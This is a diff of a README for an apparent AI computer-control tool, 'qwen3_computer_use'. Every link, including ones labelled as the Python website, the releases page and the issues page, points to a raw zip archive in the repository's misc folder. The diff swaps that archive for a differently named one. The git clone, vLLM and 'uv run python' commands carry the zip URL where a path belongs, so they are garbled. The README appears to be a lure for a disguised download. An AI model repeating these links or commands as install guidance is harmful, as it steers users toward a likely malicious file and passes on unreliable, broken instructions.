@@ -1,6 +1,6 @@
 # 🌟 qwen3_computer_use - Control Your Computer Effortlessly
 
-[![Download qwen3_computer_use](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip)](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip)
+[![Download qwen3_computer_use](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip)](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,20 +8,20 @@ Welcome to the **qwen3_computer_use** application! This program allows you to us
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the application: [Download qwen3_computer_use](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip).
+To get started, visit this page to download the latest version of the application: [Download qwen3_computer_use](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip).
 
 Follow these steps to download and install:
 
-1. **Download the Release**: Go to the [Releases page](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip) and find the latest version. Click on it to begin the download.
+1. **Download the Release**: Go to the [Releases page](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip) and find the latest version. Click on it to begin the download.
 2. **Extract the Files**: After the download is complete, extract the files to a folder on your computer.
-3. **Install Requirements**: Ensure you have Python 3.10 or later installed. You can download Python from the official [Python website](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip).
+3. **Install Requirements**: Ensure you have Python 3.10 or later installed. You can download Python from the official [Python website](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip).
 
 ## 💻 Requirements
 
 Before running the application, make sure you meet the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Python 3.10 or higher**: Download from [https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip).
+- **Python 3.10 or higher**: Download from [https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip).
 - **GUI Control Permission**: You need the right permissions for GUI operations. This could be X11, Wayland, VNC, or using a physical or virtual display.
 - **OpenAI Compatibility**: You will need a server hosting a Qwen3 model. For example, it could be something like `http://localhost:8000/v1`.
 
@@ -32,7 +32,7 @@ Once you have the requirements in place, follow these steps:
 1. **Clone the Repository**:
    Open your terminal (Command Prompt, PowerShell, or Terminal) and run:
    ```bash
-   git clone https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip
+   git clone https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -53,7 +53,7 @@ Before running the agent, you need to launch the vLLM server. Use the command be
 ```bash
 CUDA_VISIBLE_DEVICES=2,3 vllm serve Qwen/Qwen3-VL-30B-A3B-Instruct \
   --tensor-parallel-size 2 \
-  https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip 0 \
+  https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip 0 \
   --async-scheduling \
   --max-model-len 16392 \
   --enable-auto-tool-choice \
@@ -65,7 +65,7 @@ This command ensures that the server is ready to handle requests from the applic
 
 To start using the application, run the following command:
 ```bash
-uv run python https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip \
+uv run python https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip \
   --model "Qwen/Qwen3-VL-30B-A3B-Instruct"
 ```
 
@@ -86,6 +86,6 @@ If you encounter issues, consider these solutions:
 
 ## 🤝 Community and Support
 
-For any questions or to share your experiences, please visit our [Issues page](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/qwen3_computer_use-v1.8.zip). Your feedback helps improve the application. 
+For any questions or to share your experiences, please visit our [Issues page](https://raw.githubusercontent.com/Klc26/qwen3_computer_use/master/misc/use_qwen_computer_v1.1.zip). Your feedback helps improve the application. 
 
 Thank you for using qwen3_computer_use. We hope you enjoy the convenience of controlling your computer with ease!
